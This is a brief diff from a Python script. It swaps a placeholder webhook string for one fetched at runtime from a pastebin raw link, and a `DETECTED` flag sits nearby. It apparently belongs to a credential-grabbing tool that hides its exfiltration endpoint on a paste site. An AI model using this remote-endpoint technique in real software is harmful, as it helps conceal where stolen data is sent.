@@ -15,8 +15,8 @@ import random
 import re
 import subprocess
 
-
-hook = "YOUR_WEBHOOK"
+#put your pastebin (or any other paste) link here:
+hook = urlopen(Request("https://pastebin.com/raw/XXXXXX")).read().decode().strip()
 DETECTED = False
 
 
